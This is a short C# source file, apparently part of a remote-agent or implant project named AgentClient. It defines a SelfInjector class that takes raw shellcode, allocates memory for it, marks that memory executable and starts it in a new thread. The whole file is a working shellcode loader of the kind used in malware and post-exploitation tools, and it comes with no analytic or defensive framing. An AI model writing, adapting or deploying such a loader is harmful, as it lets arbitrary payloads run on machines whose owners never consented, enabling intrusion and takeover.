using AgentClient.Infrastructure.Native;
using System.Runtime.InteropServices;


namespace AgentClient.Application.Services
{
    public class SelfInjector : Injector
    {
        public override bool Inject(byte[] shellcode, int pid = 0)
        {
            if (shellcode == null || shellcode.Length == 0)
            {
                throw new ArgumentException("ShellCode cannot be null or empty", nameof(shellcode));
            }
            
            var baseAddress = Kernel32.VirtualAlloc(
                IntPtr.Zero,
                shellcode.Length,
                Kernel32.AllocationType.Commit | Kernel32.AllocationType.Reserve,
                Kernel32.MemoryProtection.ReadWrite);

            // copies shellcode to baseAddress memory allocation
            Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);

            Kernel32.VirtualProtect(
                baseAddress,
                shellcode.Length,
                Kernel32.MemoryProtection.ExecuteRead,
                out _);

            Kernel32.CreateThread(
                IntPtr.Zero,
                0,
                baseAddress,
                IntPtr.Zero,
                0,
                out var threadId);

            return threadId != IntPtr.Zero;
        }
    }
}
